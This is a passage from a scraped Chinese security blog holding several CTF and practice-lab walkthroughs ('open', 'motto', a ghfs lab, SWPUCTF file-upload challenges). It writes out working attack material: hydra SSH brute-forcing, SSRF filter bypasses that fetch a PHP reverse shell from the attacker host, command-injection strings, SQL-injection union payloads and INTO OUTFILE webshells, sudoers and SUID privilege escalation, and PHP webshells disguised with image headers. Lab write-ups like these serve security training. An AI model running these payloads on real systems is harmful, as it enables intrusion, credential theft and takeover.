authorized_keys 和私钥 id_rsa 。将私钥下载到本地，尝试用于后续的登录。 复制粘贴上面的内容到kali的新建文件里面(后面用的时候要指定这个文件在kali里面所在的路径)即可 二、初始访问1. 漏洞利用：SSH弱口令爆破首先尝试使用从 Web 服务下载的私钥登录 2222 端口的 SSH 服务，但以失败告终。 1ssh -i id_rsa -p 2222 scycree@192.168.56.5 //用私钥登录ssh 2222端口 随后，尝试用同一私钥登录运行在 22 端口的 ssh-chat 服务，这次登录成功了。但在进一步探索中，并未发现其他有价值的线索。值得注意的是， ssh-chat 服务的当前用户为 scycree ，且登录横幅中提到了 todd ，这可能是一个重要提示。 1ssh -i id_rsa scycree@192.168.56.5 //用私钥登录默认的ssh 22端口 因此，决定对 2222 端口的 SSH 服务进行弱口令爆破。使用 hydra 工具，以 todd 和 scycree 为用户名字典，结合常用密码字典进行爆破。 1hydra -L user.txt -P techyou.txt ssh://192.168.56.5:2222 -V -I -e nsr -f -u //正确语法--注意大小写 爆破成功，获得用户 todd 的密码为 todd 。 1hydra -l user.txt -P pass.txt ssh://192.168.56.5:2222 -V -I -e nsr -f -u //错误语法 -l user.txt ❌（错误用法） -l 应该接 单个用户名（如 -l admin），但你传了一个文件 user.txt Hydra 会直接尝试用 user.txt 作为用户名去登录，而不是读取文件内容 正确用法： 如果你想用 文件里的多个用户名，应该用 -L： 1hydra -L user.txt -P pass.txt ssh://192.168.56.5:2222 -V -I -e nsr -f -u 如果 user.txt 是 单个用户名，应该直接写： 1hydra -l admin -P pass.txt ssh://192.168.56.5:2222 -V -I -e nsr -f -u 其他参数解释 参数 作用 -P pass.txt 指定密码字典文件（每行一个密码） ssh://192.168.56.5:2222 目标 SSH 服务（IP:端口） -V 显示详细尝试过程 -I 立即开始攻击（跳过等待） -e nsr 额外尝试：空密码 (n)、用户名当密码 (s)、反向用户名 (r) -f 找到第一个有效密码后停止 -u 对每个用户尝试所有密码（默认是每个密码尝试所有用户） 2. 获取 Shell使用获取的凭据 todd:todd 成功通过 SSH 登录到目标系统。 三、权限提升1. 水平提升：todd -&gt; scycree登录 todd 账户后，发现当前权限较低。目标是提升至 root 权限。注意到系统上还存在另一个用户scycree 。尝试爆破 scycree 用户的密码。 首先，将本地的密码爆破工具 suForce 和字典 rockyou.txt 上传到靶机的 &#x2F;tmp 目录。(下面忘记进入到tmp目录下面了，其实不用进目录都可以，进目录只是方便管理罢了) /tmp 是 所有用户可写的临时目录，常用于存储短期文件。 渗透测试中：常用于上传攻击载荷或临时存储数据。 suForcesuForce 是一款专门用于 SSH 暴力破解 的高性能工具，相比 Hydra、Medusa 等传统工具，它在某些情况下速度更快。下面是suForce的使用方法。 在渗透测试或CTF比赛中，如果目标服务器上存在 suForce 工具（SSH暴力破解工具），你可以使用 wget 从远程服务器下载它。(相当于就是这个时候我已经ssh登录到靶机上了，所以我可以在自己的kali攻击机上面放密码爆破工具 suForce 和字典 rockyou.txt到我自己的服务器上面，然后我再ssh操控靶机下载我kali服务器的suForce 和rockyou.txt到靶机上面，之后就可以在靶机上面爆破scycree的密码了) 1chmod 644 /var/www/html/suForce //给予suForce权限以便后面顺利下载到靶机上面 1234wget 192.168.56.3/rockyou.txtwget 192.168.56.3/suForcechmod +x suForce //给予执行权限./suForce -u scycree -w rockyou.txt 成功爆破出 scycree 用户的密码为 welcome 。使用 su 命令切换到 scycree 用户。 2. 垂直提升：scycree -&gt; root切换到 scycree 用户后，执行 sudo -l 查看其 sudo 权限。 ghfs(文件上传功能)发现 scycree 用户可以无密码以 root 权限执行 &#x2F;usr&#x2F;bin&#x2F;ghfs (Go HTTP File Server)。 ghfs 带有文件上传功能，这构成了严重的安全漏洞。可以利用这个权限，向 &#x2F;etc&#x2F;sudoers.d&#x2F; 目录上传一个恶意的 sudo 配置文件，从而授予自己完全的 root 权限。 首先，以 root 权限启动 ghfs ，并将其根目录和上传目录都设置为 &#x2F;etc&#x2F;sudoers.d&#x2F; 。 1sudo /usr/bin/ghfs -r /etc/sudoers.d/ --upload-dir /etc/sudoers.d/ //以 `sudo` 权限运行，并将 `/etc/sudoers.d/` 目录作为根目录，同时允许上传文件到该目录。 接着，在本地创建一个文件，内容为赋予 scycree 用户所有命令的无密码 sudo 权限。 1echo &quot;scycree ALL=(ALL:ALL) NOPASSWD: ALL&quot; &gt; a //在攻击机kali上执行 然后，通过浏览器访问 ghfs 提供的 Web 服务 ( http://192.168.56.5:80 )，将 a 文件上传。 上传成功后， scycree 的 sudo 权限被更新。此时，再次执行 sudo -l 可以看到新增的权限。 最后，执行 sudo bash 即可获得一个 root shell。执行 sudo bash 命令会尝试以 root 权限启动一个新的 bash shell。 1. 命令作用 sudo：以超级用户权限执行后续命令。 bash：启动一个新的 Bash shell。组合后效果：直接获得一个具有 root 权限的交互式 shell。 2. 执行后的权限变化 普通用户 → root 用户 123whoami # 原用户（如 kali）sudo bashwhoami # 变为 root","categories":[{"name":"群友靶机","slug":"群友靶机","permalink":"http://example.com/categories/%E7%BE%A4%E5%8F%8B%E9%9D%B6%E6%9C%BA/"}],"tags":[{"name":"ghfs","slug":"ghfs","permalink":"http://example.com/tags/ghfs/"},{"name":"ssh弱口令爆破","slug":"ssh弱口令爆破","permalink":"http://example.com/tags/ssh%E5%BC%B1%E5%8F%A3%E4%BB%A4%E7%88%86%E7%A0%B4/"}]},{"title":"群友靶机--open","slug":"群友靶机--open","date":"2025-08-04T16:00:09.549Z","updated":"2025-08-11T12:32:43.825Z","comments":true,"path":"2025/08/05/群友靶机--open/","permalink":"http://example.com/2025/08/05/%E7%BE%A4%E5%8F%8B%E9%9D%B6%E6%9C%BA--open/","excerpt":"","text":"一、信息收集扫靶机IP–arp-scan -l 扫靶机IP开放的端口—nmap 先看80端口 页面一开始访问不出来，想到要域名解析1vim /etc/hosts 域名解析添加完之后80端口页面访问成功 扫靶机目录 1dirsearch -u http://open.dsz/ 1dirsearch -u http://192.168.56.4/ 这就有点玄学了，域名可以扫出文件而IP却扫不出原因可能是Web 服务器的虚拟主机配置： 大多数 Web 服务器（如 Apache 或 Nginx）支持 基于域名的虚拟主机。这意味着服务器根据 HTTP 请求中的 Host 头字段（即域名）来决定提供哪个网站的内容。 当您在浏览器或工具中访问 open.dsz 时： 请求包含 Host: open.dsz 头。 Web 服务器识别该域名，并返回与该虚拟主机对应的内容（例如包含 info.php 的目录）。 当您直接扫描 IP 地址 192.168.56.4 时： 请求的 Host 头通常是 IP 地址（如 Host: 192.168.56.4）或为空。 Web 服务器可能： 返回一个 默认虚拟主机 的内容（该主机可能没有 info.php）。 返回一个 空站点 或 错误页面。 拒绝提供敏感目录（如某些服务器会屏蔽对 IP 的直接访问）。 /etc/hosts 仅影响 本地 DNS 解析，确保 open.dsz 解析到 192.168.56.4。它不改变 HTTP 请求中的 Host 头。 如何验证 使用 curl 测试响应差异： 12345# 测试域名访问（应返回 info.php 的内容）curl -v http://open.dsz/info.php# 测试 IP 访问（可能返回错误或空内容）curl -v http://192.168.56.4/info.php 检查输出中的 HTTP 响应码（如 200 OK 或 404 Not Found）和内容。 如果 IP 访问返回 404，而域名访问返回 200，则确认是虚拟主机问题。 另外一种扫目录的方式—gobuster(推荐)1gobuster dir -u http://open.dsz -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x.php,.html,.txt -x.php,.html,.txt 是目录扫描工具中的扩展名参数，它直接影响扫描的深度和效果。以下是详细解释： 作用原理 基础扫描模式： 默认只扫描目录：http://target.com/&#123;单词&#125; 示例：扫描 http://open.dsz/admin（不检查文件） 添加 -x 后的增强模式： 同时扫描文件：http://target.com/&#123;单词&#125;&#123;扩展名&#125; 示例：扫描 http://open.dsz/info.php http://open.dsz/backup.html http://open.dsz/notes.txt 为什么对发现 info.php 至关重要 场景 扫描目标 能否发现 info.php 不加 -x.php http://open.dsz/info ❌ 仅测试目录 添加 -x.php http://open.dsz/info.php ✅ 直接测试文件 扩展名问题：-x 参数后不能有空格（确保是 -x.php,.html,.txt 而非 -x .php,.html,.txt） 12- -x .php,.html,.txt # 错误（空格导致 .php 被忽略）+ -x.php,.html,.txt # 正确 根据上面的目录扫描可知有info.php和info.txt，分别访问一下 1curl http://open.dsz/info.txt //也可以直接用URL指令来看 查看 info.txt 的内容发现它包含 PHP 代码，这暗示服务器可能存在文件包含或解析漏洞。 二、初始访问Web 渗透 (SSRF)网站主页提供了一个功能，允许通过 URL 参数 ?url&#x3D; 来加载指定的页面。 经过测试，发现后端对 URL 进行了限制，只允许加载以 http://open 开头的地址，并且会解析 info.txt ，正常的思路是这个过滤机制可以通过在 URL 中使用 @ 符号来绕过，这是一种典 型的服务器端请求伪造 (SSRF) 漏洞。我们可以利用此漏洞，使服务器请求并执行我们托管的恶意文件。 攻击步骤： 在攻击机（kali）上开启apache2的 HTTP 服务器。 在攻击机 (Kali) 上创建一个反弹 shell 的 txt 文件 ( reverse.txt )里面写的是php代码 在 Kali 上开启 netcat 监听。 在靶机上构造恶意的 URL，利用 @ 符号绕过主机验证，并指向攻击机(kali)上的反弹 shell 文件。 最后在攻击机（kali）上面开启的监听就会有回显。 1.在攻击机（kali）上开启apache2的 HTTP 服务器。 2.在攻击机 (Kali) 上创建一个反弹 shell 的 txt 文件 ( reverse.txt )里面写的是php代码，要存放在&#x2F;var&#x2F;www&#x2F;html&#x2F;目录下。可以在浏览器上面访问说明这个文件存放位置且配置成功(kali有自带的反弹shell的文件) 3.在 Kali 上开启 netcat 监听1nc -lp 1234 4.在靶机上构造恶意的 URL，利用 @ 符号绕过主机验证，并指向攻击机(kali)上的反弹 shell 文件。 拓展知识： 上面要求我们输入一个以http://open开头的 url，但是网页前面已经有http://open.dsz，这就构成了双URL，所以此时要截断前面的open访问后面我们想要访问的地址，即可能存在 SSRF 漏洞的迹象，让我们澄清我们的怀疑。 我也尝试了所有带有白名单过滤器绕过的方法，我也得到了回复 🔻SSRF payload 绕过过滤器 为了正确进行 SSRF 攻击，可能存在需要绕过过滤器的用例 模式验证 在这种情况下，可以使用基于白名单的输入过滤器来限制用户可以提交的 URL 类型。例如，过滤器可能只允许与白名单模式匹配的网址。在这种情况下，您可以使用各种技术绕过过滤器： 在 URL 中使用字符，如下所示：@ https://&#123;url&#125;@&#123;target_host&#125; 使用字符指示第一个字段被解释为 URL 片段，如下所示：# https://&#123;target_host&#125;#&#123;url&#125; 使用 DNS 名称将所需的输入放入完全限定的 DNS 中，如下所示： https://&#123;url&#125;.&#123;target_host&#125; URL 编码，甚至双 URL 编码此特殊字符以绕过过滤器 使用所有这些技术的组合，例如使用字符。#@ 1http://boxing.hmv#127.0.0.1 or http://boxing.hmv@127.0.0.1 5.最后在攻击机（kali）上面开启的监听就会成功反弹shell回显。 6.上面的反弹shell会话显示不太习惯，所以我就用指令变成交互式的1/usr/bin/script -qc /bin/bash /dev/null //启动一个干净的 bash 会话，且不记录任何操作日志（隐蔽性较强）。 7.获取初始 shell 后，在 &#x2F;home 目录下发现了 giao , miao , xiao 三个用户。 1find . //直接查找 ‘.’表示当前目录及其所有子目录。快捷省时 三、权限提升1. 从 www**-**data 到 miao在 &#x2F;opt 目录中，发现了一个具有 SUID 权限的可执行文件 echo 。/opt 目录是一个可选（Optional）软件安装目录，通常用于存放第三方或独立开发的应用程序（非系统自带软件包） 通过逆向分析 echo 文件，发现它存在命令注入漏洞。 命令注入漏洞123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081int __fastcall main(int argc, const char **argv, const char **envp)&#123;char v4[2]; // [rsp+1Eh] [rbp-232h] BYREF_QWORD v5[2]; // [rsp+20h] [rbp-230h] BYREFint v6; // [rsp+30h] [rbp-220h]char v7[8]; // [rsp+34h] [rbp-21Ch] BYREFchar dest[524]; // [rsp+40h] [rbp-210h] BYREFint v9; // [rsp+24Ch] [rbp-4h]if ( setgid(0x3E8u) || setuid(0x3E8u) )&#123;fwrite(&quot;鏉冮檺璁剧疆澶辫触\\n&quot;, 1uLL, 0x13uLL, stderr);return 1;&#125;else if ( argc &gt; 1 )&#123;v5[0] = 0xE75B27206F686365LL;v5[1] = 0x93BEE8B788E6A894LL;v6 = 1571128805;strcpy(v7, &quot;: &quot;);strcpy(v4, &quot;&#x27;&quot;);strcpy(dest, (const char *)v5);strcat(dest, argv[1]);strcat(dest, v4);printf(asc_2047, dest);v9 = system(dest);if ( v9 == -1 )&#123;perror(s);return 1;&#125;else&#123;return 0;&#125;&#125;else&#123;printf(&quot;浣跨敤鏂规硶: %s \\&quot;瑕佸洖鏄剧殑娑堟伅\\&quot;\\n&quot;, *argv);return 1;&#125;&#125; 该程序会将其获取的命令行参数直接拼接到一个系统命令字符串中并执行，并且会以用户 miao (UID\\1000) 的权限运行。 利用此漏洞，通过注入 bash -p 命令，我们成功获得了一个拥有 miao 用户权限的 shell。 “‘; id; whoami #” 中的单引号‘是跟前面的单引号’闭合，紧接着逗号；结束，再输入我们要查找的指令即可，后面的井号#是注释掉后面的内容。 12345678910111213141516171819www-data@Open:/opt$ ./echo &quot;&#x27;; id; whoami #&quot;执行命令: echo &#x27;[用户输入]: &#x27;; id; whoami #&#x27;[用户输入]:uid=1000(miao) gid=1000(miao) groups=1000(miao),33(www-data)miaowww-data@Open:/opt$ ./echo &quot;&#x27;; bash -p #&quot;执行命令: echo &#x27;[用户输入]: &#x27;; bash -p #&#x27;[用户输入]:miao@Open:/opt$ iduid=1000(miao) gid=1000(miao) groups=1000(miao),33(www-data) 2. 从 miao 到 root成为 miao 用户后，执行 sudo -l 发现该用户可以无密码执行 &#x2F;opt&#x2F;hello.sh 脚本。 查看该脚本内容，发现它对输入参数 “dsz” 做了判断。如果参数完全等于 “dsz”，脚本会直接退出。然 而，脚本使用了 [ $1 &#x3D; “dsz” ] 这种不严谨的判断方式。法一直接用空格绕过 法二：我们也可以通过 bash 的通配符扩展（globbing）来绕过这个检查。 在 &#x2F;tmp 目录下创建一个名为 “dsz “ （注意末尾有空格）的文件。 执行 sudo &#x2F;opt&#x2F;hello.sh * ，此时 * 会被 shell 扩展为文件名 “dsz “ ，从而绕过了 [ “$1” &#x3D; “dsz” ] 的检查，并成功执行了 cat &#x2F;root&#x2F;password.txt 命令。 1234567miao@Open:/tmp$ touch &#x27;dsz &#x27;miao@Open:/tmp$ sudo /opt/hello.sh *6cd1f22e65d26246530ff7a2528144e3Goodbye! 我们得到了一个 MD5 哈希。值得注意的是，脚本中获取哈希的方式是 cat &#x2F;root&#x2F;password.txt | md5sum ，这意味着被哈希的原始密码字符串末尾会包含一个换行符 ( \\n )。使用自定义的 Python 脚本，针对包含换行符的密码进行爆破，最终成功破解出 root 用户的密码为 do167watt041 。(在kali执行py,代码缩进有问题执行不了) 12345678910111213141516171819202122232425262728293031323334353637383940414243444546import threadingimport hashlibf = &#x27;/usr/share/wordlists/rockyou.txt&#x27;h = &#x27;6cd1f22e65d26246530ff7a2528144e3&#x27;fnd = Falsethd = 1000def md5chk(w): global fnd if fnd: return m = hashlib.md5(w).hexdigest() if m == h: with threading.Lock(): if not fnd: fnd = True print(f&#x27;\\n[+] 命中: &#123;w.decode().strip()&#125;&#x27;) exit() with open(f, &#x27;rb&#x27;) as fd: lines = fd.readlines() print(&quot;爆破中...&quot;)def worker(line): global fnd if not fnd: md5chk(line) ts = []for line in lines: if fnd: break while threading.active_count() &gt; thd: pass t = threading.Thread(target=worker, args=(line,)) t.start() ts.append(t) for t in ts: t.join() if not fnd: print(&quot;\\n[-] 未找到匹配项&quot;) 使用该密码成功切换到 root 用户。 1234miao@Open:/tmp$ su -Password: do167watt041root@Open:~# iduid=0(root) gid=0(root) groups=0(root) 拓展知识：恢复终端 如果按 Ctrl+Z 暂停了一个进程（比如 vim 或 ncat，ssh），不想再重新输入命令重新开启vim 或 ncat,ssh等等。 执行 stty raw -echo; fg 后： stty raw -echo 确保终端恢复正常输入输出。 fg 恢复 ssh 会话。 1stty raw -echo; fg","categories":[{"name":"群友靶机","slug":"群友靶机","permalink":"http://example.com/categories/%E7%BE%A4%E5%8F%8B%E9%9D%B6%E6%9C%BA/"}],"tags":[{"name":"url截断","slug":"url截断","permalink":"http://example.com/tags/url%E6%88%AA%E6%96%AD/"},{"name":"SSRF","slug":"SSRF","permalink":"http://example.com/tags/SSRF/"}]},{"title":"群友靶机--motto","slug":"群友靶机--motto","date":"2025-08-04T01:07:42.520Z","updated":"2025-08-08T02:16:36.766Z","comments":true,"path":"2025/08/04/群友靶机--motto/","permalink":"http://example.com/2025/08/04/%E7%BE%A4%E5%8F%8B%E9%9D%B6%E6%9C%BA--motto/","excerpt":"","text":"一、信息收集扫靶机IP–arp-scan -l 扫靶机IP开放的端口–nmap 192.168.56.151 80****端口 80端口只是一个前端小游戏，没什么切入点 9090端口存在单引号闭合，存在注入 sql第一次注入(攻击者首先将恶意数据合法地存入数据库（第一次注入时数据被安全处理）) 确定字段长度 sql第二次注入(之后当应用程序从数据库取出这些数据并再次使用时触发SQL注入（第二次使用时未做防护）) 注册一下表名 1&#x27; union select 1,2, table_name from information_schema.tables where table_schema=database(); -- - 方案1注册一下字段名 123&#x27; union select 1,2, column_name from information_schema.columns wheretable_schema=database() and table_name=&#x27;register_infos&#x27;; -- - (1)看一下注册信息 1&#x27; union select 1,username,password from register_infos; -- - (2)单次获取全表数据 1&#x27; UNION SELECT 1,2, GROUP_CONCAT(CONCAT_WS(&#x27;|&#x27;, user_id, nickname, username, password)SEPARATOR &#x27;&lt;br&gt;&#x27;)FROM register_infos -- - 出现的密码应该是下面系统用户的密码 看一下系统用户 1&#x27; union select 1,2,load_file(&#x27;/etc/passwd&#x27;); -- - 查出来系统有redbean用户 方案2（没成功）往80端口的web服务写一个马 123&#x27; union select 1,1,&#x27;&lt;?php @eval($_POST[1]);?&gt; into outfile&#x27;/var/www/html/config.php&#x27;; -- - ssh连接查找user的flag 12系统用户：redbean密码：cannotforgetyou 二、提权使用 find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null 找到有一个 &#x2F;opt&#x2F;run_newsh12345678910111213141516find / -perm -u=s -type f 2&gt;/dev/null //用于在 Linux 系统中查找具有 **SUID（Set User ID）** 权限的可执行文件，通常用于提权检测命令分解find /从根目录开始递归搜索所有文件和目录。-perm -u=s查找权限中包含 SUID 位的文件（即 -rwsr-xr-x 中的 s）。SUID 特性：当用户执行该文件时，会以文件所有者的权限运行（如 root），可能被滥用于提权。-type f只搜索普通文件（排除目录、符号链接等）。2&gt;/dev/null将错误信息（如权限不足）重定向到黑洞，只显示有效结果。 常见 SUID 提权目标如果发现以下命令具有 SUID 权限，可能容易利用： 12345678910/bin/bash/usr/bin/find/usr/bin/nmap/usr/bin/vim/usr/bin/less/usr/bin/more/usr/bin/awk/usr/bin/man/usr/bin/cp/usr/bin/mv 利用方式示例 利用 find 提权（如果 /usr/bin/find 有 SUID）： bash 1find /dev/null -exec /bin/bash -p \\; -exec 会以 root 权限执行 /bin/bash -p（-p 保留特权）。 利用 vim 提权： bash 1vim -c &#x27;:!/bin/sh&#x27; 利用 bash 提权： bash 1/bin/bash -p 在redbean的home目录下有一个 .backup 备份目录(.backup 通常指 网站或应用程序的备份文件。这些文件可能意外暴露敏感信息（如源代码、数据库凭证、配置文件等），成为攻击者获取系统权限的突破口。) 常见的 .backup 文件类型以下是可能存在的备份文件扩展名或命名格式： 常规备份文件.bak, .backup, .old, .save, ~（如 index.php~） 版本控制备份.git, .svn, .hg（版本控制目录可能包含历史代码） 编辑器临时文件.swp（Vim 临时文件）, .swo, .un~（Emacs 备份） 数据库备份.sql, .dump, .db.bak 压缩包备份.zip, .tar.gz, .rar, .7z（如 website_backup.zip） new.sh文件名：new.sh 是用户自定义的脚本名称（非系统默认文件），常见于： 自动化任务（如备份、部署） CTF 题目中的提权脚本 恶意攻击者植入的后门脚本 提权利用：如果 new.sh 是 SUID 文件（属主为 root），可能用于提权： bash 1find / -name new.sh -perm -4000 2&gt;/dev/null cat new.sh 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465#!/bin/bashPATH=/usr/binecho -e &quot;\\033[1;35m&quot;echo &#x27;▓▒░ Loading system diagnostics ░▒▓&#x27;echo -e &quot;\\033[0m&quot;echo -e &quot;\\033[1;34m[INFO]\\033[0m Initializing environment checks:&quot;for step in A B C; do echo -e &quot;\\033[1;33m ● Module $&#123;step&#125; status: OK (ver $(($RANDOM%5+1)).$(($RANDOM%20)).$(($RANDOM%500)))\\033[0m&quot; sleep 0.12doneecho &quot;Random seed value: $RANDOM&quot;echo -e &quot;\\033[1;34m[INFO]\\033[0m Evaluating input parameters...&quot;sleep 0.15[ -n &quot;$1&quot; ] || exit 1[ &quot;$1&quot; = &quot;flag&quot; ] &amp;&amp; exit 2[ $1 = &quot;flag&quot; ] &amp;&amp; chmod +s /bin/bash echo -e &quot;\\033[1;34m[INFO]\\033[0m Running diagnostic sequence:&quot;for step in &#123;1..3&#125;; do echo -e &quot;\\033[1;35m → Executing test $&#123;step&#125; of 3\\033[0m&quot; sleep 0.2doneWAIT_TIME=$((RANDOM%5+2))echo -e &quot;\\033[1;36m\\nWaiting period: \\033[3$&#123;WAIT_TIME&#125;m$&#123;WAIT_TIME&#125; seconds\\033[0m&quot;for ((i=WAIT_TIME; i&gt;=0; i--)); do case $((i%4)) in 0) COL=&quot;34&quot; ;; # 蓝 OL=&quot;32&quot; ;; # 绿 2) COL=&quot;31&quot; ;; # 红 OL=&quot;36&quot; ;; # 青 esac case $((i%2)) in 0) echo -e &quot;\\033[1;$&#123;COL&#125;m&gt;&gt; Waiting T-$&#123;i&#125; seconds...\\033[0m&quot; ;; 1) echo -e &quot;\\033[1;$&#123;COL&#125;m&gt;&gt; Countdown: $&#123;i&#125;\\033[0m&quot; ;; esac [ $i -gt 0 ] &amp;&amp; sleep 1doneRESULTS=( &quot;Diagnostics complete.&quot; &quot;All systems nominal.&quot; &quot;No errors detected.&quot; &quot;System stable.&quot;)FINAL_MSG=$&#123;RESULTS[$RANDOM % $&#123;#RESULTS[@]&#125;]&#125;echo -e &quot;\\033[1;32m$&#123;FINAL_MSG&#125;\\033[0m&quot;echo -e &quot;\\033[1;34mThank you for using the system monitor.\\033[0m&quot;echo -e &quot;\\033[1;30m[STATS] Summary Report:\\033[0m&quot;echo -e &quot; Processes checked: $((RANDOM%60+20))&quot;echo -e &quot; CPU load average: $(echo &quot;scale=2; $RANDOM%10+0.5&quot; | bc)&quot;echo -e &quot; Uptime (hours): $((RANDOM%100+1))&quot; run_newsh.c 12345678910111213141516171819202122232425262728293031323334353637#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;int main(int argc, char *argv[]) &#123;if (argc != 2) &#123;fprintf(stderr, &quot;Usage: %s &lt;arg&gt;\\n&quot;, argv[0]);return 1;&#125;// 切换为 root 权限（如果以 setuid 运行）setuid(0);setgid(0);// 构造参数，调用 ./new.sh 参数char *script = &quot;/opt/new.sh&quot;;char *args[] = &#123; script, argv[1], NULL &#125;;execv(script, args); // 用 execv 调用脚本perror(&quot;execv failed&quot;);return 1;&#125; 在 new.sh 的这三行 12345[ -n &quot;$1&quot; ] || exit 1[ &quot;$1&quot; = &quot;flag&quot; ] &amp;&amp; exit 2[ $1 = &quot;flag&quot; ] &amp;&amp; chmod +s /bin/bash 第三个条件没有转换成字符串加个空格就能绕过 1执行 redbean@motto:~$ /opt/run_newsh &#x27;flag &#x27; //当看到下面的bc的时候说明这个就执行成功了 1234567ls -al /bin/bashbash -pcd /rootls -al 1. ls -al /bin/bash作用：检查 /bin/bash 的权限和属性关键点： 查看 bash 是否设置了 SUID（Set User ID） 权限（-rwsr-xr-x 中的 s）。 如果 /bin/bash 有 SUID 位，并且属主是 root，则普通用户执行时会以 root 权限运行。 示例输出： bash 1-rwsr-xr-x 1 root root 1234376 Mar 27 2022 /bin/bash s 表示 SUID 权限，可被用于提权。 2. bash -p作用：以 特权模式（privileged mode） 启动 bash关键点： -p 参数会保留当前用户的 特权环境（如果 SUID 生效，则可能获得 root shell）。 如果 /bin/bash 是 SUID 文件，执行后会直接进入 root 权限的 shell。 提权成功标志： bash 1whoami # 返回 &quot;root&quot; 3. cd /root作用：尝试进入 /root 目录关键点： /root 是 Linux 系统的 root 用户家目录，默认只有 root 可访问。 如果前一步提权成功，可以进入并查看敏感文件（如 flag、SSH 密钥、日志等）。 失败情况： 如果没有 root 权限，会报错： bash 1cd: permission denied: /root 4. ls -al作用：列出 /root 目录下的所有文件关键点： 查看是否有敏感文件，例如： flag.txt（CTF 常见） .ssh/authorized_keys（可添加后门 SSH 密钥） .bash_history（可能包含管理员执行的命令记录） 数据库备份、配置文件等。 同时也可以这样 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657redbean@motto:~$ mkdir testredbean@motto:~$ touch test/flagredbean@motto:~$ cd test/redbean@motto:~/test$ /opt/run_newsh &quot;*&quot;▓▒░ Loading system diagnostics ░▒▓[INFO] Initializing environment checks:● Module A status: OK (ver 1.12.97)● Module B status: OK (ver 1.7.137)● Module C status: OK (ver 4.16.344)Random seed value: 17150[INFO] Evaluating input parameters...[INFO] Running diagnostic sequence:→ Executing test 1 of 3→ Executing test 2 of 3→ Executing test 3 of 3Waiting period: 2 seconds\\&gt;&gt; Waiting T-2 seconds...\\&gt;&gt; Countdown: 1\\&gt;&gt; Waiting T-0 seconds...All systems nominal.Thank you for using the system monitor.[STATS] Summary Report:Processes checked: 68/opt/new.sh: line 60: bc: command not foundCPU load average:Uptime (hours): 83redbean@motto:~/test$ ls -al /bin/bash-rwsr-sr-x 1 root root 1168776 Apr 18 2019 /bin/bashredbean@motto:~/test$","categories":[{"name":"群友靶机","slug":"群友靶机","permalink":"http://example.com/categories/%E7%BE%A4%E5%8F%8B%E9%9D%B6%E6%9C%BA/"}],"tags":[{"name":"sql二次注入","slug":"sql二次注入","permalink":"http://example.com/tags/sql%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/"},{"name":"motto","slug":"motto","permalink":"http://example.com/tags/motto/"}]},{"title":"文件上传","slug":"文件上传","date":"2025-07-31T11:34:38.458Z","updated":"2025-08-01T11:41:03.442Z","comments":true,"path":"2025/07/31/文件上传/","permalink":"http://example.com/2025/07/31/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/","excerpt":"","text":"[SWPUCTF 2021 新生赛]easyupload1.0(文件上传，文件头绕过，MIME绕过) 抓包看到因为要有符合的文件头格式image&#x2F;jpeg，所以一开始上传木马的时候就要把后缀改成符合的格式(.jpg)才能上传显示路径 再把(.jpg改成.php执行木马)，成功显示路径 用蚁剑连接 发现是假的flag 改变思路，把上传的文件内容改成如下： 12&lt;?php phpinfo();?&gt;&lt;?php @eval(&#x27;phpinfo();&#x27;);?&gt; 再重新抓包，显示路径 最后去浏览器里面访问，Ctrl+f搜索flag即可 1url?abc=phpinfo(); //这里的abc是我设置的木马密码 拓展知识MIME（Multipurpose Internet Mail Extensions）类型用于标识文件的内容类型（如 image/jpeg、text/plain）。在文件上传漏洞中，MIME 绕过是指攻击者通过伪造或篡改文件的 MIME 类型，绕过服务器的文件类型检测，从而上传恶意文件（如 PHP 木马）。 1. 为什么需要 MIME 绕过？许多网站会对上传的文件进行MIME 类型检查，例如： 只允许 image/jpeg、image/png 等图片类型。 拒绝 application/x-php、text/x-php 等危险类型。 如果直接上传 .php 文件，服务器可能会检测到其 MIME 类型是 application/x-php 并拒绝上传。此时，攻击者可以伪造 MIME 类型，使其看起来像合法的文件（如 image/jpeg），从而绕过检测。 2. 如何伪造 MIME 类型？（1）直接修改 HTTP 请求的 Content-Type在 Burp Suite 或浏览器开发者工具中，拦截文件上传请求，修改 Content-Type 为允许的类型（如 image/jpeg）： 12345678POST /upload.php HTTP/1.1Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryABC123------WebKitFormBoundaryABC123Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;shell.php&quot;Content-Type: image/jpeg &lt;!-- 伪造 MIME 类型 --&gt;&lt;?php system($_GET[&#x27;cmd&#x27;]); ?&gt; 这样，服务器可能误认为这是一个 JPEG 文件，但实际上它是 PHP 代码。 （2）修改文件内容 + 伪造 MIME有些服务器不仅检查 Content-Type，还会检查文件头（Magic Bytes）。此时可以： 在 PHP 文件开头添加图片头（如 GIF89a）： 12GIF89a&lt;?php system($_GET[&#x27;cmd&#x27;]); ?&gt; 这样文件既是合法的 GIF，又能被 PHP 解析。 上传时设置 Content-Type: image/gif： 12Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;shell.php&quot;Content-Type: image/gif [SWPUCTF 2021 新生赛]easyupload2.0(文件上传，文件头绕过，双写后缀) 1.要传马 2.传马之后发现php后缀不行 3.改一个后缀phtml 4.上传成功，然后用蚁剑连接即可，注意一定勾选base64，不然的话就会报错连接不上 拓展知识1. 服务器过滤机制 黑名单过滤：题目可能使用了黑名单策略拦截常见危险后缀（如 .php、.php5），但未全面覆盖其他可执行后缀（如 .phtml、.phar）。 MIME类型&#x2F;内容检测：虽然文件内容被检查，但若题目仅简单验证文件头或后缀，修改后缀可能绕过检测。 2. .phtml 的特殊性 历史背景：.phtml 是早期用于混合HTML和PHP代码的后缀（如 index.phtml），现代PHP环境中仍默认支持解析。 绕过效果：将木马后缀改为 .phtml 可能直接绕过黑名单，同时仍被当作PHP执行。 3. 题目设计意图 考察选手对多种可执行后缀的了解，而不仅限于 .php。 提示选手尝试冷门后缀（如 .phtml、.php3、.htaccess）或利用大小写变异（如 .PhP）。 [SWPUCTF 2021 新生赛]easyupload3.0(文件上传，.htaccess，MIME绕过)) 访问路径后发现文件地址，并且为Apache。Apache&#x2F;2.4.7 (Ubuntu) ，既然是 